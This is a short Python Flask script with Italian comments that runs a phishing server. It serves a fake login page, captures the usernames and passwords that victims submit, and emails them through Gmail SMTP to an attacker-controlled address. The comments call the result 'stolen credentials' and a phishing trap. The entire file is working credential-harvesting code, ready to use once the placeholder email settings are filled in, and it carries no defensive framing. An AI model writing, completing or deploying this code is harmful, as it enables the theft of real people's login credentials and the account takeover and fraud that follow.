from flask import Flask, render_template, request
import smtplib
from email.mime.text import MIMEText
import os

# Crea l'app Flask e imposta il path della cartella templates
app = Flask(__name__, template_folder=os.path.join(os.path.dirname(__file__), 'templates'))

# Funzione che invia le credenziali via email
def send_email(username, password):
    sender = "youremail@gmail.com"  # <-- Cambia con la tua email
    receiver = "attackeremail@gmail.com"  # <-- Email dove ricevere le credenziali
    subject = "Nuove credenziali rubate 😈"
    body = f"Username: {username}\nPassword: {password}"

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = receiver

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender, 'yourpassword')  # <-- Usa una password per app
            server.sendmail(sender, receiver, msg.as_string())
            print("✅ Credenziali inviate via email.")
    except Exception as e:
        print(f"❌ Errore nell'invio dell'email: {e}")

# Route per la pagina di login (finta)
@app.route('/')
def index():
    return render_template('login.html')  # Mostra il form di login falso

# Route che riceve i dati del form
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    print(f"[+] Credenziali ricevute: {username} / {password}")
    send_email(username, password)
    return "Login ricevuto... (ma era un phishing 😈)"

# Avvia il server Flask
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)  # Può richiedere permessi di root su Linux
